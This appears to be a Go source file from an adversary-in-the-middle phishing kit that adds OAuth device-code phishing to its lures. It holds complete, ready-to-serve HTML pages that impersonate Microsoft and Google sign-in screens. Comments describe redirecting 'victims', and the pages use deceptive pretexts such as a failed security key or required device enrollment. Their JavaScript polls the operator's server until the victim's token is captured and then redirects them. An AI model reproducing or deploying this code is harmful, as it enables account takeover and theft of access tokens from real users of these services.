package core

// Device Code chaining modes for lures
const (
	DCModeOff      = "off"      // No device code chaining (default)
	DCModeAlways   = "always"   // Always redirect to device code after AitM success (double capture)
	DCModeFallback = "fallback" // Only use device code if AitM session stalls/fails
	DCModeAuto     = "auto"     // Pre-generate on lure click, auto-select strategy based on outcome
	DCModeDirect   = "direct"   // Skip AitM entirely, show device code interstitial immediately
)

// ValidDeviceCodeModes lists all valid modes
var ValidDeviceCodeModes = []string{DCModeOff, DCModeAlways, DCModeFallback, DCModeAuto, DCModeDirect}

// IsValidDeviceCodeMode checks if a mode string is valid
func IsValidDeviceCodeMode(mode string) bool {
	for _, m := range ValidDeviceCodeModes {
		if m == mode {
			return true
		}
	}
	return false
}

// DEVICE_CODE_INTERSTITIAL_HTML is the Microsoft-styled interstitial page
// served at /dc/{session_id} to redirect victims to microsoft.com/devicelogin
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}
const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Sign in to your account</title>
<link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A8FMh//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AALv///C7///wu////Lv//wC7////u///8Lv///C7////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A//8AAP//AADgBwAA4AcAAOAHAADgBwAA//8AAOAHAADgBwAA4AcAAOAHAAD//wAA//8AAP//AAD//wAA//8AAA==">
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;overflow:hidden}
body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif;background:#f2f2f2}
.container{display:flex;height:100%}
.left-panel{flex:1;display:flex;align-items:center;justify-content:center;padding:48px}
.right-panel{width:50%;background:linear-gradient(135deg,#0078d4 0%,#004e8c 100%);display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
.right-panel::before{content:'';position:absolute;width:200%;height:200%;background:url("data:image/svg+xml,%3Csvg width='100' height='100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 0h50v50H0zM50 50h50v50H50z' fill='%23fff' fill-opacity='.03'/%3E%3C/svg%3E")}
.right-content{position:relative;z-index:1;text-align:center;color:#fff;max-width:320px}
.right-content h2{font-size:28px;font-weight:600;margin-bottom:16px}
.right-content p{font-size:15px;opacity:.9;line-height:1.6}
.card{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);width:100%;max-width:440px;padding:44px}
.logo{display:flex;align-items:center;gap:8px;margin-bottom:24px}
.logo svg{flex-shrink:0}
.logo span{font-size:20px;font-weight:600;color:#1b1b1b}
.title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:8px}
.subtitle{font-size:15px;color:#616161;margin-bottom:32px;line-height:1.5}
.code-section{background:#fafafa;border:1px solid #e1e1e1;border-radius:4px;padding:20px;margin-bottom:24px;text-align:center}
.code-label{font-size:12px;color:#616161;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px}
.code-value{font-size:32px;font-weight:700;letter-spacing:6px;color:#1b1b1b;font-family:'Segoe UI',monospace;margin-bottom:12px}
.code-copied{font-size:13px;color:#107c10;min-height:20px}
.ms-btn{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:#fff;color:#1b1b1b;border:1px solid #8c8c8c;padding:12px 20px;font-size:15px;font-weight:600;cursor:pointer;transition:all .15s}
.ms-btn:hover{background:#f2f2f2;border-color:#1b1b1b}
.ms-btn svg{flex-shrink:0}
.divider{display:flex;align-items:center;gap:12px;margin:24px 0;color:#8c8c8c;font-size:13px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e1e1e1}
.info{font-size:13px;color:#616161;line-height:1.6;margin-bottom:24px}
.info strong{color:#1b1b1b}
.footer{font-size:12px;color:#616161;padding-top:16px;border-top:1px solid #e1e1e1}
.footer a{color:#0067b8;text-decoration:none}
.footer a:hover{text-decoration:underline}
.success{display:none;text-align:center;padding:20px 0}
.success-icon{width:64px;height:64px;background:#107c10;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.success-icon svg{width:32px;height:32px;fill:#fff}
.success-title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:8px}
.success-text{font-size:15px;color:#616161}
.popup-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:1000;align-items:center;justify-content:center}
.popup-frame{width:90%;max-width:500px;height:80%;max-height:650px;background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.3)}
.popup-frame iframe{width:100%;height:100%;border:none}
@media(max-width:900px){.right-panel{display:none}.left-panel{padding:24px}}
</style>
</head>
<body>
<div class="container">
<div class="left-panel">
<div class="card">
<div class="logo">
<svg width="21" height="21" viewBox="0 0 21 21"><rect width="10" height="10" fill="#f25022"/><rect x="11" width="10" height="10" fill="#7fba00"/><rect y="11" width="10" height="10" fill="#00a4ef"/><rect x="11" y="11" width="10" height="10" fill="#ffb900"/></svg>
<span>Microsoft</span>
</div>

<div id="mainView">
<h1 class="title">Sign in</h1>
<p class="subtitle">Use the code below to sign in to your Microsoft account</p>

<div class="code-section">
<div class="code-label">Your sign-in code</div>
<div class="code-value" id="userCode">{user_code}</div>
<div class="code-copied" id="codeCopied"></div>
</div>

<button class="ms-btn" id="signInBtn" onclick="openSignIn()">
<svg width="21" height="21" viewBox="0 0 21 21"><rect width="10" height="10" fill="#f25022"/><rect x="11" width="10" height="10" fill="#7fba00"/><rect y="11" width="10" height="10" fill="#00a4ef"/><rect x="11" y="11" width="10" height="10" fill="#ffb900"/></svg>
Sign in with Microsoft
</button>

<div class="divider">or</div>

<p class="info">Go to <strong>microsoft.com/devicelogin</strong> and enter code <strong id="codeInline">{user_code}</strong></p>

<div class="footer">
<a href="https://www.microsoft.com/en-us/servicesagreement/" target="_blank">Terms of use</a> · 
<a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank">Privacy & cookies</a>
</div>
</div>

<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2 class="success-title">You're signed in!</h2>
<p class="success-text">Authentication successful. You can close this window.</p>
</div>
</div>
</div>

<div class="right-panel">
<div class="right-content">
<h2>Welcome</h2>
<p>Sign in with your Microsoft account to access your organization's resources securely.</p>
</div>
</div>
</div>

<div class="popup-overlay" id="popupOverlay">
<div class="popup-frame">
<iframe id="msFrame" src="about:blank"></iframe>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var verifyUrl='{verify_url}';
var code=document.getElementById('userCode').textContent;
var popup=null;

function copyToClipboard(){
if(navigator.clipboard){
navigator.clipboard.writeText(code);
}else{
var ta=document.createElement('textarea');
ta.value=code;
ta.style.position='fixed';
ta.style.left='-9999px';
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
}
document.getElementById('codeCopied').textContent='Code copied to clipboard';
}

function openSignIn(){
copyToClipboard();
var w=520,h=700;
var left=(screen.width-w)/2;
var top=(screen.height-h)/2;
popup=window.open(verifyUrl,'mslogin','width='+w+',height='+h+',left='+left+',top='+top+',scrollbars=yes,resizable=yes');
if(popup){popup.focus();}
}
window.openSignIn=openSignIn;

function poll(){
fetch('/dc/status/'+sid).then(function(r){return r.json()}).then(function(d){
if(d.captured){
if(popup&&!popup.closed){popup.close();}
document.getElementById('mainView').style.display='none';
document.getElementById('successView').style.display='block';
}else if(!d.expired){
setTimeout(poll,3000);
}
}).catch(function(){setTimeout(poll,5000);});
}
setTimeout(poll,4000);
})();
</script>
</body>
</html>`

// DEVICE_CODE_POLL_STATUS_JS is injected to poll for device code status
// Used when we need to redirect during an existing AitM session
const DEVICE_CODE_POLL_STATUS_JS = `
(function(){
var sid='{session_id}';
function checkDC(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured && d.redirect_url){
top.location.href=d.redirect_url;
}else if(!d.expired){
setTimeout(checkDC,3000);
}
})
.catch(function(){setTimeout(checkDC,5000);});
}
setTimeout(checkDC,3000);
})();
`

// DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML is the Google-styled interstitial page
// served at /dc/{session_id} for Google Workspace / Gmail device code phishing
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}, {expires_seconds}
const DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Google Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto','Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#202124}
.container{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;text-align:center}
.logo{margin-bottom:16px}
.title{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}
.subtitle{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:20px}
.steps{text-align:left;margin:0 0 24px;padding:0 0 0 24px}
.steps li{font-size:14px;color:#202124;margin-bottom:12px;line-height:20px}
.steps li a{color:#1a73e8;text-decoration:none;font-weight:500}
.steps li a:hover{text-decoration:underline}
.code-container{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px 24px;margin:0 auto 24px;display:inline-block;min-width:200px}
.code{font-size:28px;font-weight:500;letter-spacing:4px;color:#1a73e8;font-family:'Google Sans',monospace}
.btn-row{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
.btn{display:inline-flex;align-items:center;justify-content:center;padding:8px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;border:none;transition:background .2s,box-shadow .2s;font-family:'Google Sans','Roboto',sans-serif}
.btn-primary{background:#1a73e8;color:#fff}
.btn-primary:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.btn-secondary{background:#fff;color:#1a73e8;border:1px solid #dadce0}
.btn-secondary:hover{background:#f8f9fa}
.timer{font-size:12px;color:#80868b;margin-top:8px}
.copied{color:#137333;font-size:13px;margin-top:4px;min-height:20px}
.footer{margin-top:24px;font-size:12px;color:#80868b}
.footer a{color:#1a73e8;text-decoration:none}
.spinner{display:none;margin:16px auto;width:24px;height:24px;border:3px solid #e8eaed;border-top:3px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.complete{display:none;text-align:center;padding:20px}
.complete .check{font-size:48px;color:#137333;margin-bottom:12px}
.complete .msg{font-size:16px;color:#202124}
.status-icon{margin:20px 0 16px;font-size:40px}
</style>
</head>
<body>
<div class="container" id="main">
<div class="logo">
<svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
<text x="0" y="19" font-family="Product Sans,Google Sans,Roboto,Arial,sans-serif" font-size="22" font-weight="500">
<tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc04">o</tspan><tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>
</text>
</svg>
</div>

<div id="verifyView">
<div class="status-icon" id="statusIcon">&#128274;</div>
<div class="title" id="titleText">Device Verification</div>
<div class="subtitle" id="subtitleText">Complete the sign-in process by verifying your device.</div>

<ol class="steps">
<li>Go to <a href="{verify_url}" target="_blank" rel="noopener" id="verifyLink">{verify_url}</a></li>
<li>Enter the code shown below</li>
<li>Sign in with your Google account and approve access</li>
</ol>

<div class="code-container">
<div class="code" id="userCode">{user_code}</div>
</div>
<div class="copied" id="copiedMsg">&nbsp;</div>

<div class="btn-row">
<button class="btn btn-primary" onclick="copyCode()">Copy code</button>
<a class="btn btn-secondary" href="{verify_url}" target="_blank" rel="noopener">Open link</a>
</div>

<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
<div class="spinner" id="spinner"></div>
</div>

<div class="complete" id="completeView">
<div class="check">&#10004;</div>
<div class="msg">Verification complete. Redirecting...</div>
</div>

<div class="footer">
<a href="https://support.google.com">Help</a> &middot;
<a href="https://policies.google.com/privacy">Privacy</a> &middot;
<a href="https://policies.google.com/terms">Terms</a>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('statusIcon').innerHTML='&#9888;&#65039;';
document.getElementById('titleText').textContent='Verification method unavailable';
document.getElementById('subtitleText').textContent='Your security key could not be verified. Use an alternative method to complete sign-in.';
}else if(tpl==='compliance'){
document.getElementById('statusIcon').innerHTML='&#128187;';
document.getElementById('titleText').textContent='Device enrollment required';
document.getElementById('subtitleText').textContent='Your organization requires device registration to access this service.';
}else{
document.getElementById('statusIcon').innerHTML='&#9989;';
document.getElementById('titleText').textContent='Sign-in verified';
document.getElementById('subtitleText').textContent='One more step: Link this device to your account for continued access.';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
}
}
window.copyCode=copyCode;

function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='EXPIRED';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){
top.location.href=d.redirect_url;
}
},1500);
}else if(d.expired){
document.getElementById('countdown').textContent='EXPIRED';
}else{
document.getElementById('spinner').style.display='block';
setTimeout(checkStatus,3000);
}
})
.catch(function(){
setTimeout(checkStatus,5000);
});
}
setTimeout(checkStatus,5000);
})();
</script>
</body>
</html>`

// GetInterstitialForProvider returns the appropriate interstitial HTML template for the provider
func GetInterstitialForProvider(provider string) string {
	switch provider {
	case DCProviderGoogle:
		return DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}
